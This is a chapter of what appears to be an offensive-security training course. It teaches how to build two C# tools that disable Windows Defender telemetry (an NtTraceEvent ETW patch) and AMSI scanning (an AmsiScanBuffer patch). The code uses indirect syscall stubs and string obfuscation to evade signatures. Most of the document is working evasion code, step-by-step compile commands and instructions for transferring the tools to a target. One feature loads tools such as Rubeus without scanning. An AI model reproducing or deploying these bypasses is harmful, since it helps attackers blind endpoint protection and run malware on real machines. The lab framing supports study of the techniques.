# Document 08: AMSI Bypass and ETW Patching - Blinding Defender's Eyes

## Where We Are

You finished Documents 05, 06, and 07. You have built three loaders that all survive Defender:

- **Loader 01** (Document 05): Raw shellcode embedded via DllImport. Survives Defender with default settings. The XOR encoding keeps static signatures below the detection threshold.
- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime with two-step memory allocation. Survives Defender. Confirmed with a Meterpreter callback on the target.
- **Loader 03** (Document 07): Indirect syscall stubs (FindSyscallGadget + BuildStub), embedded XOR-encoded shellcode, two-step RW-then-RX allocation. Fully bypasses ntdll API hooks. Confirmed working on target with Defender fully active.

Your C# knowledge at this point:

- DllImport, P/Invoke, calling Windows API functions from C#
- VirtualAlloc, Marshal.Copy, CreateThread, NtAllocateVirtualMemory, NtCreateThreadEx
- Delegates and unmanaged function pointers via Marshal.GetDelegateForFunctionPointer
- GetModuleHandle, GetProcAddress for dynamic function resolution
- Building strings from integer offsets to hide function names from static scanners
- Two-step memory allocation (RW then RX) via NtProtectVirtualMemory
- XOR encryption and in-binary embedded shellcode
- FindSyscallGadget: scanning ntdll for the 0F 05 C3 (syscall; ret) bytes
- BuildStub: writing 22-byte indirect syscall stubs that jump past ntdll hooks

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

Loader 03 gave you a callback, but two detection layers are still active on the target:

1. **ETW (Event Tracing for Windows)** is still logging activity. Every time Loader 03 calls NtAllocateVirtualMemory or NtCreateThreadEx through its indirect syscall stubs, the Windows kernel still generates ETW events for those operations. Loader 03 survives because the overall behavioral score stays below Defender's threshold, but ETW is actively recording what your process does. A more sensitive policy, or a commercial EDR that uses ETW more aggressively, will catch those event sequences.

2. **AMSI (Antimalware Scan Interface)** is still scanning .NET code at runtime. Loader 03 survived because its managed code has no malicious patterns. But if you want to run PowerShell commands or load additional .NET tools after getting access, AMSI will inspect those and can block them.

Loader 03's indirect syscall stubs already fully defeat API hook inspection (covered in Document 07). This document addresses the remaining two gaps.

You will learn Loader 07 (ETW patch) first and then Loader 04 (AMSI bypass). The order matters because patching AMSI generates ETW events that describe what was modified. If you patch ETW first, the logging system is already silenced when you then patch AMSI, so no event is generated and Defender does not know AMSI was touched.

After this document, you will have two utility loaders. Document 10 combines both patches with Loader 03's shellcode execution into a single binary that patches ETW, patches AMSI, and then executes shellcode all in one run.

## How This Works

### ETW: Why Windows Tracks What Programs Do

When you run a program on Windows, Windows needs to know what that program is doing. Is it allocating memory? Creating threads? Connecting to the internet? Windows needs this information because Defender cannot protect the system if it does not know what programs are up to. Without some kind of tracking, a malicious program could do anything it wants and Defender would have no idea.

So Windows has a built-in tracking system called ETW, which stands for Event Tracing for Windows. It has been part of every Windows version since XP. Here is how it works: every time your program does something (allocates memory, opens a file, creates a thread, connects to a network), Windows writes a log entry that describes what happened. These log entries are called ETW events.

Defender reads these log entries in real time. When Defender sees a sequence like "this program allocated memory, wrote data into it, made it executable, and created a thread pointing to it", Defender recognizes that as the shellcode injection pattern and blocks the program. Without ETW, Defender would not know that sequence of events happened.

The function responsible for writing all these log entries is called EtwEventWrite. It lives inside ntdll.dll. Every time your program does something that needs to be logged, Windows calls EtwEventWrite to send the log entry to Defender and any other security product that is listening. Here is the important part: if EtwEventWrite stops working, no log entries get sent. Defender receives nothing. Your program goes dark. Defender cannot detect suspicious behavior patterns if it never receives the events that describe the behavior.

There is one important limitation. The ETW we are patching is the user-mode version. There is also a kernel-mode ETW provider called Microsoft-Windows-Threat-Intelligence that runs inside the Windows kernel itself. Because the kernel runs at a higher privilege level than your program, you cannot patch it from user mode. Default Windows Defender primarily uses user-mode ETW telemetry, so patching user-mode EtwEventWrite is enough to blind Defender. Some advanced EDR products use the kernel provider, and this patch does not affect them. Document 11 discusses what happens when you face those products.

### AMSI: Why Windows Checks PowerShell Commands

PowerShell is a command-line tool that comes pre-installed on every Windows computer. It is extremely powerful. You can use PowerShell to download files from the internet, run programs in memory, manage user accounts, read and write the registry, and control nearly everything on the system. System administrators use it every day because it makes managing Windows computers fast and easy.

Hackers noticed the same thing. Because PowerShell is already on every Windows machine, hackers started using it to run malicious commands. They did not need to bring their own malware onto the computer. They just opened PowerShell and typed commands that download and execute payloads, dump passwords, or move through a network. This is called "living off the land" because you use tools that are already on the machine instead of bringing your own.

Microsoft had a problem. They could not remove PowerShell because millions of system administrators depend on it. But they needed a way to stop hackers from abusing it. So they created AMSI, which stands for Antimalware Scan Interface. Microsoft added AMSI in Windows 10, and it is still active in Windows 11.

AMSI's job is simple. Before PowerShell runs any command you type, AMSI checks that command with Defender first. Here is the step-by-step flow:

1. You type a command into PowerShell.
2. Before PowerShell runs the command, it passes the command text to AMSI.
3. AMSI sends the command text to Defender.
4. Defender checks the command against its signature database.
5. If Defender says the command is malicious, AMSI tells PowerShell to block it. You see an error message saying the script was blocked.
6. If Defender says the command is clean, AMSI tells PowerShell to run it normally.

AMSI does not only check PowerShell. It also checks VBScript, JScript, and the .NET runtime (which is what runs your C# programs). So when your C# loader runs, AMSI can check the managed code inside it.

AMSI is implemented as a DLL file called amsi.dll. This DLL gets loaded into every process that hosts a scripting engine. The main function inside amsi.dll is called AmsiScanBuffer. When PowerShell (or any scripting engine) wants to check content, it calls AmsiScanBuffer with the content bytes. AmsiScanBuffer talks to Defender and returns a result code that says either "this is malicious, block it" or "this is clean, allow it."

Here is the weakness that makes our bypass work. If AmsiScanBuffer returns an error code instead of a real scan result, the scripting engine does not treat the error as "something is wrong, block everything." Instead, it treats the error as "the scan could not be done, allow the content." Our patch overwrites the beginning of AmsiScanBuffer with instructions that make it return the error code E_INVALIDARG (0x80070057) immediately, without scanning anything. After the patch, every call to AmsiScanBuffer returns this error. The scripting engine thinks the scan failed, not that the content is malicious, and it allows everything through.

### Why ETW Must Be Patched Before AMSI

When you modify a DLL's code in memory (which is what the AMSI patch does), that modification generates ETW events. Specifically, EtwEventWrite logs events related to code integrity and module loading. Defender's behavioral engine monitors these events. If Defender sees "process X modified amsi.dll in memory", that is a known attack pattern. Defender can flag the process immediately.

If you patch ETW first, EtwEventWrite is already neutered. When you then patch AMSI, the patching operation tries to generate ETW events, but EtwEventWrite just returns success without writing anything. Defender never learns that amsi.dll was modified.

The execution order is:

1. Patch EtwEventWrite in ntdll.dll (Loader 07)
2. Patch AmsiScanBuffer in amsi.dll (Loader 04)
3. Now run your shellcode or PowerShell scripts (no scanning, no logging)

### Why the Previous Patching Approach Was Caught

The obvious approach to patching ETW and AMSI is to find the function, use VirtualProtect to make the code page writable, write a few bytes that make the function return immediately, then restore protection. Loaders that do this are caught by Defender before they even run.

Defender's static scanner looks for this exact combination in a compiled binary: a DllImport for VirtualProtect alongside DllImports for GetModuleHandle and GetProcAddress in the same assembly. This triad (GetModuleHandle + GetProcAddress + VirtualProtect) is a named Defender signature pattern because virtually every AMSI bypass and ETW patch tool uses exactly these three imports together. Defenders calls this the "MpTest!amsi" detection cluster.

Additionally, the classic patch bytes for each target are directly signatured:
- ETW patch: `0x33 0xC0 0xC3` (xor eax,eax; ret) - 3 bytes, directly in the database
- AMSI patch: `0xB8 0x57 0x00 0x07 0x80 0xC3` (mov eax, E_INVALIDARG; ret) - 6 bytes, directly in the database

These are signatured regardless of arithmetic obfuscation. If you write `patch[0] = (byte)(0x19 + 0x1A)` to produce 0x33 at runtime, Defender's scanner evaluates that arithmetic at scan time and still sees 0x33. Constant-folding at the scanner level defeats simple arithmetic obfuscation.

### How Loader 07 Works: NtTraceEvent Indirect Syscall Patch

Loader 07 sidesteps both detection signals. It does not import VirtualProtect at all, and it patches a different target function.

**No VirtualProtect DllImport:** instead of VirtualProtect, Loader 07 uses an indirect NtProtectVirtualMemory syscall stub - the same technique from Loader 03 (BuildStub + FindSyscallGadget). VirtualProtect is completely absent from the binary's import table. The DllImport list is GetModuleHandle, GetProcAddress, VirtualAlloc (for the 22-byte stub block). This combination is not in Defender's detection patterns.

**Different target function - NtTraceEvent instead of EtwEventWrite:** EtwEventWrite is the most commonly targeted function and has the most detection signatures. NtTraceEvent is the underlying NT syscall stub that all ETW wrapper functions eventually call. One byte written to NtTraceEvent silences EtwEventWrite and every other ETW writer in the process. NtTraceEvent is a less commonly signatured target because fewer public tools use it directly.

**Single byte 0xC3 instead of 3-byte xor pattern:** A single `0xC3` (ret instruction) byte is not signaturable in isolation - that byte appears in millions of binaries. The classic 3-byte sequence `0x31 0xC0 0xC3` (or `0x33 0xC0 0xC3`) is signatured because it appears only in this context. Callers of NtTraceEvent do not check the return value, so returning immediately with whatever happens to be in `eax` works the same as `xor eax,eax; ret`.

The execution flow: Loader 07 calls BuildStub for NtProtectVirtualMemory (same 22-byte trampoline as in Loader 03), changes NtTraceEvent's page from RX to RW via that stub (no VirtualProtect call), writes 0xC3 via Marshal.WriteByte, restores protection via the stub again.

### How Loader 04 Works: AmsiScanBuffer Indirect Syscall Patch

Loader 04 uses exactly the same indirect syscall technique as Loader 07, applied to a different target. It patches AmsiScanBuffer, which is the function inside amsi.dll that actually scans content. When AmsiScanBuffer is called after the patch, it returns immediately without inspecting anything.

The steps: find ntdll base, find the `syscall; ret` gadget inside ntdll, allocate 22 bytes for the stub, build an indirect NtProtectVirtualMemory stub using BuildStub (same as Loaders 03 and 07), load amsi.dll via LoadLibraryA (built from integer offsets at runtime), find AmsiScanBuffer inside amsi.dll via GetProcAddress (function name also built from offsets), change AmsiScanBuffer's page from RX to RW via the indirect stub, write a single byte 0xC3 (ret) at the function start, then restore the original page protection via the indirect stub.

After the patch, any call to AmsiScanBuffer returns immediately. The amsiResult output parameter is never written, so it keeps whatever value the caller initialized it to (typically 0, which is AMSI_RESULT_CLEAN). The CLR's AMSI consumer checks whether amsiResult is greater than or equal to AMSI_RESULT_DETECTED (32768). Zero is less than 32768, so content passes.

DllImports in Loader 04: GetModuleHandle, GetProcAddress, VirtualAlloc, LoadLibraryA. No VirtualProtect anywhere in the binary. This combination is not in Defender's MpTest!amsi detection patterns.

### Why ETW Must Still Be Patched Before AMSI

When Loader 04 calls the indirect NtProtectVirtualMemory stub to change AmsiScanBuffer's page protection, that kernel operation generates ETW events. Defender's behavioral monitoring receives telemetry about the protection change and the memory write. If ETW is already silenced by the NtTraceEvent patch before Loader 04 runs, no event is generated and Defender sees nothing. Patch ETW first.

## What Defender Does

Here is what each Defender detection layer does when it encounters Loader 07 (ETW patch) and Loader 04 (AMSI bypass):

**Static file scanning (Loader 07):** VirtualProtect is absent from Loader 07's import table entirely. The DllImport list is GetModuleHandle, GetProcAddress, VirtualAlloc. Without VirtualProtect in the import table, the DllImport triad that triggers the MpTest!amsi detection cluster does not form. The target function name NtTraceEvent is built from integer offsets at runtime and never appears as a string in the binary. The patch byte 0xC3 is written via Marshal.WriteByte, which compiles to a generic memory-write instruction with no recognizable constant value adjacent to a VirtualProtect call.

**Static file scanning (Loader 04):** Loader 04 imports GetModuleHandle, GetProcAddress, VirtualAlloc, LoadLibraryA. This is not the same combination as the MpTest!amsi detection cluster (which requires VirtualProtect alongside GetProcAddress and GetModuleHandle). The function name "AmsiScanBuffer" and the string "amsi.dll" are never present as literals - both are built from integer offsets at runtime. The single patch byte 0xC3 is written via Marshal.WriteByte with no signaturable constant adjacent to it.

**Import table analysis:** Loader 07 imports GetModuleHandle, GetProcAddress, VirtualAlloc. Loader 04 imports GetModuleHandle, GetProcAddress, VirtualAlloc, LoadLibraryA. Neither binary contains the GetModuleHandle + GetProcAddress + VirtualProtect triad that Defender's MpTest!amsi cluster looks for. VirtualProtect is absent from both binaries.

**AMSI runtime scanning:** When the .NET CLR loads either binary, AMSI checks the managed code before Main() runs. Neither binary contains known bad patterns (no shellcode byte arrays, no PowerShell download strings, no tool names). AMSI passes both. After Loader 04 runs, AMSI is disabled in that process entirely.

**ETW telemetry:** Loader 07 targets this layer. Before the ETW patch runs, the loader's actions generate ETW events. After the single-byte NtTraceEvent patch, no more ETW events come from this process. Loader 04's NtProtectVirtualMemory call (via the indirect stub) generates an ETW event when it changes AmsiScanBuffer's page protection. This is why you run Loader 07 first, with ETW already silenced before the protection change happens.

**API hooks in ntdll.dll:** Both loaders use an indirect NtProtectVirtualMemory stub (same technique as Loader 03) to change the target function's page protection. The indirect stub jumps to a real syscall instruction inside ntdll, skipping the hooked function prologue where Defender's hook would redirect control. Loader 07 uses the stub to change NtTraceEvent's protection. Loader 04 uses the same stub to change AmsiScanBuffer's protection.

**Behavioral ML:** Writing a single byte to an NT function's code page is a behavior that exists in legitimate software (JIT compilers do exactly this). Both loaders create 22 bytes of executable memory for their syscall stub, indistinguishable from JIT stub allocation by the CLR. Neither loader's behavior profile triggers Defender's behavioral model on its own.

## The Evasion Technique

What these loaders do differently from a normal program:

A normal program never modifies the code of a system DLL in its own process. When you run notepad.exe, it never overwrites bytes inside ntdll.dll or amsi.dll. Our loaders do exactly that, and they get away with it because of several factors:

1. **Single byte patch.** Both loaders write exactly one byte (0xC3, the ret instruction) to their target function. Defender's known AMSI bypass signatures target multi-byte patterns like the 3-byte xor/ret sequence (0x31 0xC0 0xC3) or the 6-byte E_INVALIDARG sequence (0xB8 0x57 0x00 0x07 0x80 0xC3). A single 0xC3 byte does not match any of these patterns. The byte 0xC3 appears in millions of binaries as the end of every function, so it is unsignaturable in isolation.

2. **No suspicious strings.** The function names and DLL names are built from integer arithmetic at runtime. "NtTraceEvent", "NtProtectVirtualMemory", "AmsiScanBuffer", "amsi.dll", "ntdll" - none of these appear as string literals in either compiled binary. Static scanners searching for these strings find nothing.

3. **No VirtualProtect DllImport.** The classic ETW and AMSI bypass tools all import VirtualProtect via DllImport. Defender's MpTest!amsi detection cluster fires when it sees VirtualProtect + GetProcAddress + GetModuleHandle in the same binary's import table. Both loaders avoid VirtualProtect entirely by using an indirect NtProtectVirtualMemory syscall stub for the protection change.

4. **Protection restoration.** After applying the patch, both loaders restore the original memory protection via the same indirect stub. If Defender checks the memory permissions on the patched region later, it sees the normal read-execute protection that the DLL code should have.

The bytes that would normally get flagged are the multi-byte patch sequences used by older public tools, the strings "AmsiScanBuffer", "EtwEventWrite", and the VirtualProtect import. Both loaders avoid all three signals.

## Getting the Loader Onto the Target

Both Loader 07 (ETW patch) and Loader 04 (AMSI patch) are standalone executables that you compile on the dev box and transfer to the target. In practice, you will rarely run them as standalone tools. Document 10 combines both patches into Loader 08 (the combined evasion loader) which patches ETW, patches AMSI, and then executes shellcode all in one binary. But for learning, you will compile and run each one separately to understand what they do.

### Transfer Workflow

1. **Kali (192.168.10.200):** Not needed for these two loaders. They do not use shellcode. They just patch system functions.

2. **Dev box (ammulu, 192.168.10.150):** Compile both loaders. Host the compiled .exe files on a Python HTTP server.

3. **Target (kimjongun, 192.168.10.100):** Download the .exe files from the dev box. Run Loader 07 first (ETW patch), then run Loader 04 (AMSI patch).

On the dev box (ammulu), host the files:
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun), download both:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/etw_patch.exe" -OutFile "C:\Users\kimjongun\Desktop\etw_patch.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/amsi_bypass.exe" -OutFile "C:\Users\kimjongun\Desktop\amsi_bypass.exe"
```

Defender on the target scans both files when they are written to disk. Because neither binary contains suspicious strings in its import table or data section, Defender allows both files to stay on disk.

**Important limitation:** The AMSI and ETW patches affect only the process that applies them. When you run etw_patch.exe, ETW is patched inside the etw_patch.exe process. When that process exits, the patch is gone. The next process you run has a fresh, unpatched copy of ntdll.dll and amsi.dll. This means running the patches as standalone .exe files is useful for testing, but for real operations, both patches must be applied inside the same process that will execute shellcode. Document 10 handles this.

**Process tree:** Defender tracks which processes create other processes. When you run etw_patch.exe from cmd.exe or PowerShell, Defender sees cmd.exe (or powershell.exe) as the parent process and etw_patch.exe as the child. This is normal. There is nothing suspicious about the process tree for these loaders.

**Reference files:** `lab/loaders/07_etw_patch.cs` and `lab/loaders/04_amsi_bypass.cs`

## Teaching the Code

### Part 1: Loader 07 - ETW Patch

We start with the ETW patch because it must run before the AMSI patch.

#### Windows API Imports and Delegate

```csharp
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);
[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
    IntPtr addr, uint size, uint allocType, uint protect);
```

GetModuleHandle and GetProcAddress you have seen before in Loader 03. They find DLLs and functions in memory. VirtualAlloc here allocates exactly 22 bytes for the indirect syscall stub. Notice there is no VirtualProtect import. The memory protection change for NtTraceEvent goes through the stub, not through a direct VirtualProtect call.

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int NtProtectVirtualMemory_t(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    out uint OldProtect
);
```

This is the function signature for NtProtectVirtualMemory. It describes the parameters so the .NET runtime knows how to call it when we point it at our stub. The stub is not the real NtProtectVirtualMemory - it is a 22-byte trampoline that jumps to the real syscall instruction inside ntdll, bypassing any hook at the function start.

#### FindSyscallGadget and BuildStub

These two functions are identical to the ones in Loader 03. You have already seen them explained in Document 07. FindSyscallGadget scans ntdll's memory for the bytes 0x0F 0x05 0xC3 (syscall; ret) and returns the address. BuildStub reads the SSN from a named function at offset +4, then writes the 22-byte stub (mov r10,rcx + mov eax,SSN + jmp [rip+0] + gadget address) into the allocated memory. Both functions are in `lab/loaders/07_etw_patch.cs`.

#### Building Function Names at Runtime

```csharp
static string GetETWTarget()
{
    int b = 32;
    char[] c = new char[12];
    c[0]  = (char)(b+46);  // N = 78
    c[1]  = (char)(b+84);  // t = 116
    c[2]  = (char)(b+52);  // T = 84
    c[3]  = (char)(b+82);  // r = 114
```

This builds the string "NtTraceEvent" from integer arithmetic. Each character's ASCII value equals the base (32) plus the offset in the comment. 32 + 46 = 78 = ASCII 'N'. 32 + 84 = 116 = ASCII 't'. 32 + 52 = 84 = ASCII 'T'. And so on for all 12 characters.

```csharp
    c[4]  = (char)(b+65);  // a = 97
    c[5]  = (char)(b+67);  // c = 99
    c[6]  = (char)(b+69);  // e = 101
    c[7]  = (char)(b+37);  // E = 69
    c[8]  = (char)(b+86);  // v = 118
    c[9]  = (char)(b+69);  // e = 101
    c[10] = (char)(b+78);  // n = 110
    c[11] = (char)(b+84);  // t = 116
    return new string(c);
}
```

When this runs, it produces "NtTraceEvent". In the compiled binary, only the integer array exists. Static scanners searching for "NtTraceEvent" or "EtwEventWrite" find nothing. Loader 07 also has GetNtdllName() building "ntdll" and GetNtProtectName() building "NtProtectVirtualMemory" from the same technique.

#### The Patch Function: PatchTelemetry

```csharp
public static bool PatchTelemetry()
{
    string ntdllName = GetNtdllName();
    IntPtr ntdll = GetModuleHandle(ntdllName);
    ...
    IntPtr gadget;
    unsafe { gadget = FindSyscallGadget(ntdll); }
```

Step 1 and 2: Find ntdll's base address and locate the syscall gadget inside it. The gadget address is the `syscall; ret` instruction our stub will jump to.

```csharp
    IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (uint)STUB_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ...
    string protName = GetNtProtectName();
    IntPtr stubAddr = BuildStub(ntdll, protName, gadget, stubMem);
    var ntProtect = (NtProtectVirtualMemory_t)Marshal.GetDelegateForFunctionPointer(
        stubAddr, typeof(NtProtectVirtualMemory_t));
```

Step 3 and 4: Allocate 22 bytes of memory for the stub, then build the NtProtectVirtualMemory stub inside it. Marshal.GetDelegateForFunctionPointer wraps the stub address as a callable C# delegate. Calling ntProtect(...) will now execute the stub, which jumps to the real syscall instruction in ntdll.

```csharp
    string etwName = GetETWTarget();
    IntPtr etwAddr = GetProcAddress(ntdll, etwName);
```

Step 5: Find NtTraceEvent inside ntdll. NtTraceEvent is the underlying NT syscall stub that all ETW wrapper functions (EtwEventWrite, EtwEventWriteFull, and others) eventually call. Patching this one function silences all of them at once.

```csharp
    IntPtr currentProc = (IntPtr)(-1);
    IntPtr patchAddr   = etwAddr;
    IntPtr patchSize   = (IntPtr)1;
    uint oldProtect;
    int status = ntProtect(currentProc, ref patchAddr, ref patchSize, PAGE_READWRITE, out oldProtect);
```

Step 6: Change NtTraceEvent's page protection from read-execute to read-write. The call goes through the indirect stub, which executes the real NtProtectVirtualMemory syscall inside the kernel. VirtualProtect is not called anywhere. The protection change reaches the kernel through the same path as any legitimate call, but without going through ntdll's hooked function start.

```csharp
    Marshal.WriteByte(etwAddr, 0xC3);
```

Step 7: Write one byte. 0xC3 is the x86-64 ret instruction. After this single byte overwrites NtTraceEvent's first byte, any call to NtTraceEvent returns immediately. No ETW events are written. Callers of NtTraceEvent do not check its return value, so returning immediately with whatever happens to be in the eax register is functionally equivalent to the traditional xor eax,eax; ret. A single 0xC3 byte is not signaturable - it appears at the end of every function in every binary.

```csharp
    IntPtr patchAddr2 = etwAddr;
    IntPtr patchSize2 = (IntPtr)1;
    uint ignored;
    ntProtect(currentProc, ref patchAddr2, ref patchSize2, oldProtect, out ignored);
    Console.WriteLine("[+] Page protection restored to original");
    return true;
}
```

Step 8: Restore the original page protection via the same indirect stub. After this, NtTraceEvent's page is back to read-execute, which is what it should be.

#### The Main Function

```csharp
static void Main(string[] args)
{
    Console.WriteLine("[*] Telemetry Patcher");
    Console.WriteLine("[*] Method: NtTraceEvent indirect-syscall patch (single byte)");
    Console.WriteLine("[*] VirtualProtect is NOT imported in this binary.");
    ...
    bool success = PatchTelemetry();

    if (success)
    {
        Console.WriteLine("[+] ETW telemetry is now disabled in this process.");
        Console.WriteLine("[*] Run the scanner patch (Loader 04) next.");
    }
}
```

Main prints the method name (which confirms what the loader does) and calls PatchTelemetry(). If it succeeds, the message reminds you to run Loader 04 next. Because ETW is now disabled, the AMSI patch that runs next will not generate telemetry events that Defender could act on.

### The Complete ETW Patch Loader

The full source code is at `lab/loaders/07_etw_patch.cs`.

---

### Part 2: Loader 04 - AMSI Bypass

Now that you understand the ETW patch, the AMSI patch follows the same structure with a few differences.

#### Windows API Imports and Delegate

```csharp
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);
[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
    IntPtr addr, uint size, uint type, uint protect);
[DllImport("kernel32.dll")] static extern IntPtr LoadLibraryA(string name);
```

The first three imports are identical to Loader 07. The fourth import, LoadLibraryA, is new. ntdll.dll is always loaded into every Windows process, so GetModuleHandle("ntdll") always finds it. amsi.dll is not always loaded - it only gets loaded into processes that will scan content. A standalone .NET console .exe does not have amsi.dll loaded by default. LoadLibraryA forces amsi.dll into the process so we can find AmsiScanBuffer inside it. Notice there is still no VirtualProtect import. The protection change goes through the same indirect NtProtectVirtualMemory stub as Loader 07.

The delegate type and the FindSyscallGadget and BuildStub functions are identical to Loader 07.

#### Building Function Names at Runtime

```csharp
// "amsi.dll" - a(97) m(109) s(115) i(105) .(46) d(100) l(108) l(108)
static string GetAmsiDllName()
{
    int b = 32;
    char[] c = new char[8];
    c[0]=(char)(b+65); // a
    c[1]=(char)(b+77); // m
    c[2]=(char)(b+83); // s
    c[3]=(char)(b+73); // i
    c[4]=(char)(b+14); // .
    c[5]=(char)(b+68); // d
    c[6]=(char)(b+76); // l
    c[7]=(char)(b+76); // l
    return new string(c);
}
```

This builds "amsi.dll" from integer offsets. Same technique as Loader 07. The period character (.) is ASCII 46, computed as 32 + 14. LoadLibraryA needs the full filename with the ".dll" extension.

```csharp
// "AmsiScanBuffer" - 14 characters
static string GetAmsiScanBufferName()
{
    int b = 32;
    char[] c = new char[14];
    c[0]=(char)(b+33);  // A
    c[1]=(char)(b+77);  // m
    c[2]=(char)(b+83);  // s
    c[3]=(char)(b+73);  // i
    c[4]=(char)(b+51);  // S
    c[5]=(char)(b+67);  // c
    c[6]=(char)(b+65);  // a
    c[7]=(char)(b+78);  // n
    c[8]=(char)(b+34);  // B
    c[9]=(char)(b+85);  // u
    c[10]=(char)(b+70); // f
    c[11]=(char)(b+70); // f
    c[12]=(char)(b+69); // e
    c[13]=(char)(b+82); // r
    return new string(c);
}
```

This builds "AmsiScanBuffer" - 14 characters - the same way. The string never appears as a literal in the compiled binary. Loader 04 also has GetNtdllName() and GetNtProtectName() identical to Loader 07.

#### The Patch Function: PatchScanner

```csharp
public static bool PatchScanner()
{
    string ntdllName = GetNtdllName();
    IntPtr ntdll = GetModuleHandle(ntdllName);
    ...
    IntPtr gadget;
    unsafe { gadget = FindSyscallGadget(ntdll); }
    ...
    IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (uint)STUB_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    string protName = GetNtProtectName();
    IntPtr stubAddr = BuildStub(ntdll, protName, gadget, stubMem);
    var ntProtect = (NtProtectVirtualMemory_t)Marshal.GetDelegateForFunctionPointer(
        stubAddr, typeof(NtProtectVirtualMemory_t));
```

Steps 1 through 4 are identical to Loader 07: find ntdll, find the syscall gadget, allocate 22 bytes, build the NtProtectVirtualMemory stub. The stub is now ready to use for the protection change.

```csharp
    string amsiDll = GetAmsiDllName();
    IntPtr amsiBase = LoadLibraryA(amsiDll);
    ...
    string funcName = GetAmsiScanBufferName();
    IntPtr amsiScanBuf = GetProcAddress(amsiBase, funcName);
```

Step 5: Load amsi.dll and find AmsiScanBuffer inside it. LoadLibraryA maps amsi.dll into this process if it was not already there, and returns the base address. GetProcAddress then looks up AmsiScanBuffer inside that base address and returns the exact memory location of the function's first byte.

```csharp
    IntPtr currentProc = (IntPtr)(-1);
    IntPtr patchAddr   = amsiScanBuf;
    IntPtr patchSize   = (IntPtr)1;
    uint oldProtect;
    int status = ntProtect(currentProc, ref patchAddr, ref patchSize, PAGE_READWRITE, out oldProtect);
```

Step 6: Change AmsiScanBuffer's page protection from read-execute to read-write. The call goes through the indirect NtProtectVirtualMemory stub, exactly the same as Loader 07 changed NtTraceEvent's protection. VirtualProtect is never called directly.

```csharp
    Marshal.WriteByte(amsiScanBuf, 0xC3);
    Console.WriteLine("[+] Patch applied: single byte ret at AmsiScanBuffer");
```

Step 7: Write one byte. 0xC3 is ret. After this, AmsiScanBuffer returns immediately without scanning anything. The amsiResult output parameter is never written by the function, so it keeps whatever value the caller put there before calling (the CLR initializes it to 0, which is AMSI_RESULT_CLEAN). The CLR checks: if amsiResult >= AMSI_RESULT_DETECTED (32768), block the content. 0 is less than 32768, so the content passes.

```csharp
    IntPtr patchAddr2 = amsiScanBuf;
    IntPtr patchSize2 = (IntPtr)1;
    uint ignored;
    ntProtect(currentProc, ref patchAddr2, ref patchSize2, oldProtect, out ignored);
    Console.WriteLine("[+] Page protection restored");
    return true;
}
```

Step 8: Restore the original page protection via the same indirect stub.

#### The Main Function and Optional Assembly Loading

```csharp
static void Main(string[] args)
{
    Console.WriteLine("[*] Scanner Patch Loader");
    Console.WriteLine("[*] Method: AmsiScanBuffer indirect-syscall patch (single byte)");
    Console.WriteLine("[*] VirtualProtect is NOT imported in this binary.");
    ...
    bool success = PatchScanner();

    if (success)
    {
        Console.WriteLine("[+] Scanner is now disabled in this process.");
        Console.WriteLine("[+] .NET assemblies loaded here will not be inspected.");
```

Main calls PatchScanner(). If it succeeded, AMSI is disabled in this process.

```csharp
        if (args.Length > 0)
        {
            string assemblyPath = args[0];
            Console.WriteLine("[*] Loading assembly: " + assemblyPath);
            var asm = Assembly.LoadFile(assemblyPath);
            var ep  = asm.EntryPoint;
            if (ep != null)
            {
                string[] passArgs = new string[args.Length - 1];
                Array.Copy(args, 1, passArgs, 0, passArgs.Length);
                ep.Invoke(null, ep.GetParameters().Length > 0
                    ? new object[] { passArgs } : null);
            }
        }
    }
}
```

Loader 04 has an optional feature. If you pass a file path as the first argument, it loads that .NET assembly into the current process after patching AMSI. Because AMSI is already disabled in this process, the loaded assembly will not be scanned by Defender. This lets you run .NET red team tools (Rubeus, Seatbelt, SharpHound, etc.) that Defender would normally block. Assembly.LoadFile maps the .exe or .dll into the running process. EntryPoint finds the Main method. Invoke calls it with any extra arguments you passed on the command line.

### The Complete AMSI Bypass Loader

The full source code is at `lab/loaders/04_amsi_bypass.cs`.

## Compilation and Execution

### Step 1: Compile Both Loaders on the Dev Box

On the dev box (ammulu, 192.168.10.150), open Command Prompt.

Create and compile the ETW patch:
```
dotnet new console -n Loader07
```
Replace `Loader07\Program.cs` with the code from `07_etw_patch.cs`, then:
```
dotnet publish Loader07 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output07/
```
The binary is at `output07\Loader07.exe`.

Create and compile the AMSI bypass:
```
dotnet new console -n Loader04
```
Replace `Loader04\Program.cs` with the code from `04_amsi_bypass.cs`, then:
```
dotnet publish Loader04 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output04/
```
The binary is at `output04\Loader04.exe`.

The `/unsafe` flag is needed because both loaders use Marshal.Copy to write to unmanaged memory addresses. Expected output for both: the compiler produces the .exe file with no errors.

### Step 2: Transfer Both Files to the Target

On the dev box (ammulu), host both files:
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100), download both:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/etw_patch.exe" -OutFile "C:\Users\kimjongun\Desktop\etw_patch.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/amsi_bypass.exe" -OutFile "C:\Users\kimjongun\Desktop\amsi_bypass.exe"
```

